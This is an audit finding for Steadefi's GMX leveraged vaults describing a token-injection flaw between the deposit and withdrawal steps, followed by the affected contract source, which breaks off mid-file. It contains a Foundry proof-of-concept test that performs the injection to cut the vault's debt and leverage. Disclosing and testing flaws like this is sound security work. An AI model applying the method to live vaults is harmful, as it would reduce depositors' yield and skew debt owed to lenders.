{
  "Title": "Token injection leads to unintended behavior of vault",
  "Content": "# Token injection leads to unintended behavior of vault\n\n### Severity\nMedium Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L72C5-L72C52\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L72C5-L72C52</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXProcessDeposit.sol#L24C1-L30C7\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXProcessDeposit.sol#L24C1-L30C7</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXReader.sol#L129C1-L141C6\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXReader.sol#L129C1-L141C6</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXChecks.sol#L207C1-L208C50\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXChecks.sol#L207C1-L208C50</a>\n\n\n## Summary\n\nWhen a token is deposited/withdrawn in a vault, it happens in two steps. In the first step, some states of the vault are saved, which are partially important for the second step, and a request to deposit/withdraw is made to GMX. In the second step, GMX calls the callback function, and the vault completes the deposit/withdrawal. The problem is that one can send LP tokens to the contract between these two steps, causing the vault to behave unintentionally.\n\n## Vulnerability Details\n\n### Deposit\n\nHere is a PoC for the effects when sending lpTokens between the two steps during deposit:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\nimport { console, console2 } from \"forge-std/Test.sol\";\nimport { TestUtils } from \"../../helpers/TestUtils.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { GMXMockVaultSetup } from \"./GMXMockVaultSetup.t.sol\";\nimport { GMXTypes } from \"../../../contracts/strategy/gmx/GMXTypes.sol\";\nimport { GMXTestHelper } from \"./GMXTestHelper.sol\";\n\nimport { IDeposit } from \"../../../contracts/interfaces/protocols/gmx/IDeposit.sol\";\nimport { IEvent } from \"../../../contracts/interfaces/protocols/gmx/IEvent.sol\";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC2() public {\n        uint256 lpAmtUser1 = 0.000005e18; //~400$ (because price of lpToken = 79990000$)\n\n        //In the setup, the owner receives a few lpTokens, which are now sent to user1 for testing the token injection\n        vm.startPrank(owner);\n        IERC20(address(WETHUSDCpair)).transfer(address(user1), lpAmtUser1);\n        vm.stopPrank();\n        \n        //Owner deposits in Vault\n        vm.startPrank(owner);\n        _createDeposit(address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        //Variable for Assertion\n        (,uint256 debtAmtTokenBBefore) = vault.debtAmt();\n\n        vm.startPrank(user1);\n        _createDeposit(address(WETH), 0.1 ether, 0, SLIPPAGE, EXECUTION_FEE); //User1 creates deposit. The 0.1 ether is being leveraged\n        IERC20(address(WETHUSDCpair)).transfer(address(vault), lpAmtUser1); //User1 injects lp-tokens between createDeposit and processDeposit. They are not leveraged\n        vm.stopPrank();\n        //In step one, the equity was saved before the deposit. The equity depends on the LP amount and the debts to the lending Vaults. In step two, \n        //the saved equity is used alongside the current equity to calculate how many Vault shares a user receives. This way, user1 receives shares \n        //for their injected tokens that do not have any leverage.(so no borrowing from the lending vaults was done for these tokens)\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n        \n        //User1 withdraws all his tokens.\n        uint256 vaultSharesAmount = IERC20(address(vault)).balanceOf(user1);\n        vm.startPrank(user1);\n        //In the case of a withdrawal, the debts to the LendingVaults are also repaid. Since it is assumed that all tokens have been leveraged, there \n        //is a mistaken repayment to the lending vaults for the injected tokens as well.\n        _createAndExecuteWithdrawal(address(WETH), address(USDC), address(USDC), vaultSharesAmount, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n\n        //Variable for Assertion\n        (,uint256 debtAmtTokenBAfter) = vault.debtAmt();\n        \n        //After User1 withdrew their LP tokens, the debt amount for TokenB would normally be approximately the same as it was before User1 deposited. \n        //However, due to the unleveraged tokens, more debt was repaid, resulting in a lower debt and, consequently, lower leverage than before.\n        assert(debtAmtTokenBBefore - 750e6 > debtAmtTokenBAfter); //750e6 == $750. This is to show that the debt is significantly less than before\n\n        console.log(\"debtAmtTokenBBefore: %s\", debtAmtTokenBBefore);\n        console.log(\"debtAmtTokenBAfter: %s\", debtAmtTokenBAfter);\n    }\n}\n```\n\nSince the user can withdraw their injected tokens, which they received VaultShares for, they could execute this action multiple times to further worsen the tokenB debt amount and, consequently, the leverage.\n\nThe POC can be started with this command: `forge test --match-test test_POC2 -vv`\n\n### Withdraw\n\nWhen withdrawing, LP tokens can also be injected between the two steps. This can be exploited by an attacker because he can fail the afterWithdrawChecks if he sends the same amount of lp tokens that a user wants to withdraw.\n\nHere is the check that the attacker could exploit by sending enough tokens to make the lpAmt as large as it was before the withdrawal:\n\n```solidity\nFile: GMXChecks.sol#afterWithdrawChecks\n207: if (GMXReader.lpAmt(self) >= self.withdrawCache.healthParams.lpAmtBefore)\n208:       revert Errors.InsufficientLPTokensBurned();\n```\n\n## Impact\n\nSince, if this bug is exploited during deposit, an attacker can decrease the leverage, it results in users of the vault having less leverage and lower yield.\n\nWhen withdrawing, the attacker can potentially cause the withdrawal to fail, but the user doesn't lose anything and can try again.\n\n## Tools Used\n\nVSCode, Foundry\n\n## Recommendations\n\nIn the deposit function, the depositValue should be used to determine approximately how many lpTokens GMX will be transferred to the vault. This number should then be compared to the actual received amount in processDeposit.\n\nIn the case of withdrawal, after calling removeLiquidity, the lpAmt should be stored, and this should be compared to the lpAmt in the processWithdraw function to determine whether tokens were injected.",
  "Impact": "MEDIUM",
  "Source": "https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf",
  "Code": [
    {
      "filename": "contracts/strategy/gmx/GMXDeposit.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { IDeposit } from \"../../interfaces/protocols/gmx/IDeposit.sol\";\nimport { IWithdrawal } from \"../../interfaces/protocols/gmx/IWithdrawal.sol\";\nimport { IEvent } from \"../../interfaces/protocols/gmx/IEvent.sol\";\nimport { IOrder } from \"../../interfaces/protocols/gmx/IOrder.sol\";\nimport { ISwap } from  \"../../interfaces/swap/ISwap.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\nimport { GMXProcessDeposit } from \"./GMXProcessDeposit.sol\";\n\n/**\n  * @title GMXDeposit\n  * @author Steadefi\n  * @notice Re-usable library functions for deposit operations for Steadefi leveraged vaults\n*/\nlibrary GMXDeposit {\n  using SafeERC20 for IERC20;\n\n  /* ======================= CONSTANTS ======================= */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ======================== EVENTS ========================= */\n\n  event DepositCreated(\n    address indexed user,\n    address asset,\n    uint256 assetAmt\n  );\n  event DepositCompleted(\n    address indexed user,\n    uint256 shareAmt,\n    uint256 equityBefore,\n    uint256 equityAfter\n  );\n  event DepositCancelled(\n    address indexed user\n  );\n  event DepositFailed(bytes reason);\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n    * @param isNative Boolean as to whether user is depositing native asset (e.g. ETH, AVAX, etc.)\n  */\n  function deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n  ) external {\n    // Sweep any tokenA/B in vault to the temporary trove for future compouding and to prevent\n    // it from being considered as part of depositor's assets\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n      self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n      self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.HealthParams memory _hp;\n\n    _hp.equityBefore = GMXReader.equityValue(self);\n    _hp.lpAmtBefore = GMXReader.lpAmt(self);\n    _hp.debtRatioBefore = GMXReader.debtRatio(self);\n    _hp.deltaBefore = GMXReader.delta(self);\n\n    // Transfer assets from user to vault\n    if (isNative) {\n      GMXChecks.beforeNativeDepositChecks(self, dp);\n\n      self.WNT.deposit{ value: dp.amt }();\n    } else {\n      IERC20(dp.token).safeTransferFrom(msg.sender, address(this), dp.amt);\n    }\n\n    GMXTypes.DepositCache memory _dc;\n\n    _dc.user = payable(msg.sender);\n\n    if (dp.token == address(self.lpToken)) {\n      // If LP token deposited\n      _dc.depositValue = self.gmxOracle.getLpTokenValue(\n        address(self.lpToken),\n        address(self.tokenA),\n        address(self.tokenA),\n        address(self.tokenB),\n        false,\n        false\n      )\n      * dp.amt\n      / SAFE_MULTIPLIER;\n    } else {\n      // If tokenA or tokenB deposited\n      _dc.depositValue = GMXReader.convertToUsdValue(\n        self,\n        address(dp.token),\n        dp.amt\n      );\n    }\n    _dc.depositParams = dp;\n    _dc.healthParams = _hp;\n\n    self.depositCache = _dc;\n\n    GMXChecks.beforeDepositChecks(self, _dc.depositValue);\n\n    self.status = GMXTypes.Status.Deposit;\n\n    self.vault.mintFee();\n\n    // Borrow assets and create deposit in GMX\n    (\n      uint256 _borrowTokenAAmt,\n      uint256 _borrowTokenBAmt\n    ) = GMXManager.calcBorrow(self, _dc.depositValue);\n\n    _dc.borrowParams.borrowTokenAAmt = _borrowTokenAAmt;\n    _dc.borrowParams.borrowTokenBAmt = _borrowTokenBAmt;\n\n    GMXManager.borrow(self, _borrowTokenAAmt, _borrowTokenBAmt);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n      self,\n      _dc.depositValue,\n      dp.slippage\n    );\n    _alp.executionFee = dp.executionFee;\n\n    _dc.depositKey = GMXManager.addLiquidity(\n      self,\n      _alp\n    );\n\n    self.depositCache = _dc;\n\n    emit DepositCreated(\n      _dc.user,\n      _dc.depositParams.token,\n      _dc.depositParams.amt\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDeposit(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessDepositChecks(self);\n\n    // We transfer the core logic of this function to GMXProcessDeposit.processDeposit()\n    // to allow try/catch here to catch for any issues or any checks in afterDepositChecks() failing.\n    // If there are any issues, a DepositFailed event will be emitted and processDepositFailure()\n    // should be triggered to refund assets accordingly and reset the vault status to Open again.\n    try GMXProcessDeposit.processDeposit(self) {\n      // Mint shares to depositor\n      self.vault.mint(self.depositCache.user, self.depositCache.sharesToUser);\n\n      self.status = GMXTypes.Status.Open;\n\n      emit DepositCompleted(\n        self.depositCache.user,\n        self.depositCache.sharesToUser,\n        self.depositCache.healthParams.equityBefore,\n        self.depositCache.healthParams.equityAfter\n      );\n    } catch (bytes memory reason) {\n      self.status = GMXTypes.Status.Deposit_Failed;\n\n      emit DepositFailed(reason);\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDepositCancellation(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessDepositCancellationChecks(self);\n\n    // Repay borrowed assets\n    GMXManager.repay(\n      self,\n      self.depositCache.borrowParams.borrowTokenAAmt,\n      self.depositCache.borrowParams.borrowTokenBAmt\n    );\n\n    // Return user's deposited asset\n    // If native token is being withdrawn, we convert wrapped to native\n    if (self.depositCache.depositParams.token == address(self.WNT)) {\n      self.WNT.withdraw(self.WNT.balanceOf(address(this)));\n      (bool success, ) = self.depositCache.user.call{value: address(this).balance}(\"\");\n      require(success, \"Transfer failed.\");\n    } else {\n      // Transfer requested withdraw asset to user\n      IERC20(self.depositCache.depositParams.token).safeTransfer(\n        self.depositCache.user,\n        self.depositCache.depositParams.amt\n      );\n    }\n\n    self.status = GMXTypes.Status.Open;\n\n    emit DepositCancelled(self.depositCache.user);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDepositFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n  ) external {\n    GMXChecks.beforeProcessAfterDepositFailureChecks(self);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // If current LP amount is somehow less or equal to amount before, we do not remove any liquidity\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore) {\n      processDepositFailureLiquidityWithdrawal(self);\n    } else {\n      // Remove only the newly added LP amount\n      _rlp.lpAmt = GMXReader.lpAmt(self) - self.depositCache.healthParams.lpAmtBefore;\n\n      // If delta strategy is Long, remove all in tokenB to make it more\n      // efficent to repay tokenB debt as Long strategy only borrows tokenB\n      if (self.delta == GMXTypes.Delta.Long) {\n        address[] memory _tokenASwapPath = new address[](1);\n        _tokenASwapPath[0] = address(self.lpToken);\n        _rlp.tokenASwapPath = _tokenASwapPath;\n\n        (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n          self,\n          _rlp.lpAmt,\n          address(self.tokenB),\n          address(self.tokenB),\n          slippage\n        );\n      } else {\n        (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n          self,\n          _rlp.lpAmt,\n          address(self.tokenA),\n          address(self.tokenB),\n          slippage\n        );\n      }\n\n      _rlp.executionFee = executionFee;\n\n      // Remove liqudity\n      self.depositCache.withdrawKey = GMXManager.removeLiquidity(\n        self,\n        _rlp\n      );\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDepositFailureLiquidityWithdrawal(\n    GMXTypes.Store storage self\n  ) public {\n    GMXChecks.beforeProcessAfterDepositFailureLiquidityWithdrawal(self);\n\n    GMXTypes.RepayParams memory _rp;\n\n    _rp.repayTokenAAmt = self.depositCache.borrowParams.borrowTokenAAmt;\n    _rp.repayTokenBAmt = self.depositCache.borrowParams.borrowTokenBAmt;\n\n    // Check if swap between assets are needed for repayment based on previous borrow\n    (\n      bool _swapNeeded,\n      address _tokenFrom,\n      address _tokenTo,\n      uint256 _tokenToAmt\n    ) = GMXManager.calcSwapForRepay(self, _rp);\n\n    if (_swapNeeded) {\n      ISwap.SwapParams memory _sp;\n\n      _sp.tokenIn = _tokenFrom;\n      _sp.tokenOut = _tokenTo;\n      _sp.amountIn = IERC20(_tokenFrom).balanceOf(address(this));\n      _sp.amountOut = _tokenToAmt;\n      _sp.slippage = self.minSlippage;\n      _sp.deadline = block.timestamp;\n      // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n      // We allow deadline to be set as the current block timestamp whenever this function\n      // is called because this function is triggered as a follow up function (by a callback/keeper)\n      // and not directly by a user/keeper. If this follow on function flow reverts due to this tx\n      // being processed after a set deadline, this will cause the vault to be in a \"stuck\" state.\n      // To resolve this, this function will have to be called again with an updated deadline until it\n      // succeeds/a miner processes the tx.\n\n      GMXManager.swapTokensForExactTokens(self, _sp);\n    }\n\n    // Adjust amount to repay for both tokens due to slight differences\n    // from liqudiity withdrawal and swaps. If the amount to repay based on previous borrow\n    // is more than the available balance vault has, we simply repay what the vault has\n    uint256 _repayTokenAAmt;\n    uint256 _repayTokenBAmt;\n\n    if (self.depositCache.borrowParams.borrowTokenAAmt > self.tokenA.balanceOf(address(this))) {\n      _repayTokenAAmt = self.tokenA.balanceOf(address(this));\n    } else {\n      _repayTokenAAmt = self.depositCache.borrowParams.borrowTokenAAmt;\n    }\n\n    if (self.depositCache.borrowParams.borrowTokenBAmt > self.tokenB.balanceOf(address(this))) {\n      _repayTokenBAmt = self.tokenB.balanceOf(address(this));\n    } else {\n      _repayTokenBAmt = self.depositCache.borrowParams.borrowTokenBAmt;\n    }\n\n    // Repay borrowed assets\n    GMXManager.repay(\n      self,\n      _repayTokenAAmt,\n      _repayTokenBAmt\n    );\n\n    // Refund user the rest of the remaining withdrawn LP assets\n    // Will be in tokenA/tokenB only; so if user deposited LP tokens\n    // they will still be refunded in tokenA/tokenB\n    self.tokenA.safeTransfer(self.depositCache.user, self.tokenA.balanceOf(address(this)));\n    self.tokenB.safeTransfer(self.depositCache.user, self.tokenB.balanceOf(address(this)));\n\n    self.status = GMXTypes.Status.Open;\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXProcessDeposit.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\n\n/**\n  * @title GMXProcessDeposit\n  * @author Steadefi\n  * @notice Re-usable library functions for process deposit operations for Steadefi leveraged vaults\n*/\nlibrary GMXProcessDeposit {\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDeposit(\n    GMXTypes.Store storage self\n  ) external {\n    self.depositCache.healthParams.equityAfter = GMXReader.equityValue(self);\n\n    self.depositCache.sharesToUser = GMXReader.valueToShares(\n      self,\n      self.depositCache.healthParams.equityAfter - self.depositCache.healthParams.equityBefore,\n      self.depositCache.healthParams.equityBefore\n    );\n\n    GMXChecks.afterDepositChecks(self);\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXReader.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IERC20Metadata } from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\n\n/**\n  * @title GMXReader\n  * @author Steadefi\n  * @notice Re-usable library functions for reading data and values for Steadefi leveraged vaults\n*/\nlibrary GMXReader {\n  using SafeCast for uint256;\n\n  /* =================== CONSTANTS FUNCTIONS ================= */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ===================== VIEW FUNCTIONS ==================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function svTokenValue(GMXTypes.Store storage self) public view returns (uint256) {\n    uint256 equityValue_ = equityValue(self);\n    uint256 totalSupply_ = IERC20(address(self.vault)).totalSupply();\n    if (equityValue_ == 0 || totalSupply_ == 0) return SAFE_MULTIPLIER;\n    return equityValue_ * SAFE_MULTIPLIER / totalSupply_;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function pendingFee(GMXTypes.Store storage self) public view returns (uint256) {\n    uint256 totalSupply_ = IERC20(address(self.vault)).totalSupply();\n    uint256 _secondsFromLastCollection = block.timestamp - self.lastFeeCollected;\n    return (totalSupply_ * self.feePerSecond * _secondsFromLastCollection) / SAFE_MULTIPLIER;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function valueToShares(\n    GMXTypes.Store storage self,\n    uint256 value,\n    uint256 currentEquity\n  ) public view returns (uint256) {\n    uint256 _sharesSupply = IERC20(address(self.vault)).totalSupply() + pendingFee(self);\n    if (_sharesSupply == 0 || currentEquity == 0) return value;\n    return value * _sharesSupply / currentEquity;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function convertToUsdValue(\n    GMXTypes.Store storage self,\n    address token,\n    uint256 amt\n  ) public view returns (uint256) {\n    return amt * 10**(18 - IERC20Metadata(token).decimals())\n                * self.chainlinkOracle.consultIn18Decimals(token)\n                / SAFE_MULTIPLIER;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function tokenWeights(GMXTypes.Store storage self) public view returns (uint256, uint256) {\n    // Get amounts of tokenA and tokenB in liquidity pool in token decimals\n    (uint256 _reserveA, uint256 _reserveB) = self.gmxOracle.getLpTokenReserves(\n      address(self.lpToken),\n      address(self.tokenA),\n      address(self.tokenA),\n      address(self.tokenB)\n    );\n\n    // Get value of tokenA and tokenB in 1e18\n    uint256 _tokenAValue = convertToUsdValue(self, address(self.tokenA), _reserveA);\n    uint256 _tokenBValue = convertToUsdValue(self, address(self.tokenB), _reserveB);\n\n    uint256 _totalLpValue = _tokenAValue + _tokenBValue;\n\n    return (\n      _tokenAValue * SAFE_MULTIPLIER / _totalLpValue,\n      _tokenBValue * SAFE_MULTIPLIER / _totalLpValue\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function assetValue(GMXTypes.Store storage self) public view returns (uint256) {\n    return lpAmt(self) * self.gmxOracle.getLpTokenValue(\n      address(self.lpToken),\n      address(self.tokenA),\n      address(self.tokenA),\n      address(self.tokenB),\n      false,\n      false\n    ) / SAFE_MULTIPLIER;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function debtValue(GMXTypes.Store storage self) public view returns (uint256, uint256) {\n    (uint256 _tokenADebtAmt, uint256 _tokenBDebtAmt) = debtAmt(self);\n    return (\n      convertToUsdValue(self, address(self.tokenA), _tokenADebtAmt),\n      convertToUsdValue(self, address(self.tokenB), _tokenBDebtAmt)\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function equityValue(GMXTypes.Store storage self) public view returns (uint256) {\n    (uint256 _tokenADebtAmt, uint256 _tokenBDebtAmt) = debtAmt(self);\n\n    uint256 assetValue_ = assetValue(self);\n\n    uint256 _debtValue = convertToUsdValue(self, address(self.tokenA), _tokenADebtAmt)\n                         + convertToUsdValue(self, address(self.tokenB), _tokenBDebtAmt);\n\n    // in underflow condition return 0\n    unchecked {\n      if (assetValue_ < _debtValue) return 0;\n\n      return assetValue_ - _debtValue;\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function assetAmt(GMXTypes.Store storage self) public view returns (uint256, uint256) {\n    (uint256 _reserveA, uint256 _reserveB) = self.gmxOracle.getLpTokenReserves(\n      address(self.lpToken),\n      address(self.tokenA),\n      address(self.tokenA),\n      address(self.tokenB)\n    );\n\n    return (\n      _reserveA * SAFE_MULTIPLIER * lpAmt(self) / self.lpToken.totalSupply() / SAFE_MULTIPLIER,\n      _reserveB * SAFE_MULTIPLIER * lpAmt(self) / self.lpToken.totalSupply() / SAFE_MULTIPLIER\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function debtAmt(GMXTypes.Store storage self) public view returns (uint256, uint256) {\n    return (\n      self.tokenALendingVault.maxRepay(address(self.vault)),\n      self.tokenBLendingVault.maxRepay(address(self.vault))\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function lpAmt(GMXTypes.Store storage self) public view returns (uint256) {\n    return self.lpToken.balanceOf(address(self.vault));\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function leverage(GMXTypes.Store storage self) public view returns (uint256) {\n    if (assetValue(self) == 0 || equityValue(self) == 0) return 0;\n    return assetValue(self) * SAFE_MULTIPLIER / equityValue(self);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function delta(GMXTypes.Store storage self) public view returns (int256) {\n    (uint256 _tokenAAmt,) = assetAmt(self);\n    (uint256 _tokenADebtAmt,) = debtAmt(self);\n    uint256 equityValue_ = equityValue(self);\n\n    if (_tokenAAmt == 0 && _tokenADebtAmt == 0) return 0;\n    if (equityValue_ == 0) return 0;\n\n    bool _isPositive = _tokenAAmt >= _tokenADebtAmt;\n\n    uint256 _unsignedDelta = _isPositive ?\n      _tokenAAmt - _tokenADebtAmt :\n      _tokenADebtAmt - _tokenAAmt;\n\n    int256 signedDelta = (_unsignedDelta\n      * self.chainlinkOracle.consultIn18Decimals(address(self.tokenA))\n      / equityValue_).toInt256();\n\n    if (_isPositive) return signedDelta;\n    else return -signedDelta;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function debtRatio(GMXTypes.Store storage self) public view returns (uint256) {\n    (uint256 _tokenADebtValue, uint256 _tokenBDebtValue) = debtValue(self);\n    if (assetValue(self) == 0) return 0;\n    return (_tokenADebtValue + _tokenBDebtValue) * SAFE_MULTIPLIER / assetValue(self);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function additionalCapacity(GMXTypes.Store storage self) public view returns (uint256) {\n    uint256 _additionalCapacity;\n\n    // Long strategy only borrows short token (typically stablecoin)\n    if (self.delta == GMXTypes.Delta.Long) {\n      _additionalCapacity = convertToUsdValue(\n        self,\n        address(self.tokenB),\n        self.tokenBLendingVault.totalAvailableAsset()\n      ) * SAFE_MULTIPLIER / (self.leverage - 1e18);\n    }\n\n    // Neutral strategy borrows both long (typical volatile) and short token (typically stablecoin)\n    // Amount of long token to borrow is equivalent to deposited value x leverage x longTokenWeight\n    // Amount of short token to borrow is remaining borrow value AFTER borrowing long token\n    // ---------------------------------------------------------------------------------------------\n    // E.g: 3x Neutral ETH-USDC with weight of ETH being 55%, USDC 45%\n    // A $1 equity deposit should result in a $2 borrow for a total of $3 assets\n    // Amount of ETH to borrow would be $3 x 55% = $1.65 worth of ETH\n    // Amount of USDC to borrow would be $3 (asset) - $1.65 (ETH borrowed) - $1 (equity) = $0.35\n    // ---------------------------------------------------------------------------------------------\n    // Note that for Neutral strategies, vault's leverage has to be 3x and above.\n    // A 2x leverage neutral strategy may not work to correctly to borrow enough long token to hedge\n    // while still adhering to the correct leverage factor.\n    if (self.delta == GMXTypes.Delta.Neutral) {\n      (uint256 _tokenAWeight, ) = tokenWeights(self);\n\n      uint256 _maxTokenALending = convertToUsdValue(\n        self,\n        address(self.tokenA),\n        self.tokenALendingVault.totalAvailableAsset()\n      ) * SAFE_MULTIPLIER\n        / (self.leverage * _tokenAWeight / SAFE_MULTIPLIER);\n\n      uint256 _maxTokenBLending = convertToUsdValue(\n        self,\n        address(self.tokenB),\n        self.tokenBLendingVault.totalAvailableAsset()\n      ) * SAFE_MULTIPLIER\n        / (self.leverage * _tokenAWeight / SAFE_MULTIPLIER)\n        - 1e18;\n\n      _additionalCapacity = _maxTokenALending > _maxTokenBLending ? _maxTokenBLending : _maxTokenALending;\n    }\n\n    return _additionalCapacity;\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function capacity(GMXTypes.Store storage self) public view returns (uint256) {\n    return additionalCapacity(self) + equityValue(self);\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXChecks.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IDeposit } from \"../../interfaces/protocols/gmx/IDeposit.sol\";\nimport { IWithdrawal } from \"../../interfaces/protocols/gmx/IWithdrawal.sol\";\nimport { IEvent } from \"../../interfaces/protocols/gmx/IEvent.sol\";\nimport { IOrder } from \"../../interfaces/protocols/gmx/IOrder.sol\";\nimport { Errors } from \"../../utils/Errors.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\n\n/**\n  * @title GMXChecks\n  * @author Steadefi\n  * @notice Re-usable library functions for require function checks for Steadefi leveraged vaults\n*/\nlibrary GMXChecks {\n\n  /* ====================== CONSTANTS ======================== */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n  uint256 public constant MINIMUM_VALUE = 9e16;\n\n  /* ===================== VIEW FUNCTIONS ==================== */\n\n  /**\n    * @notice Checks before native token deposit\n    * @param self GMXTypes.Store\n    * @param dp GMXTypes.DepositParams\n  */\n  function beforeNativeDepositChecks(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp\n  ) external view {\n    if (dp.token != address(self.WNT))\n      revert Errors.InvalidNativeTokenAddress();\n\n    if (\n      address(self.tokenA) != address(self.WNT) &&\n      address(self.tokenB) != address(self.WNT)\n    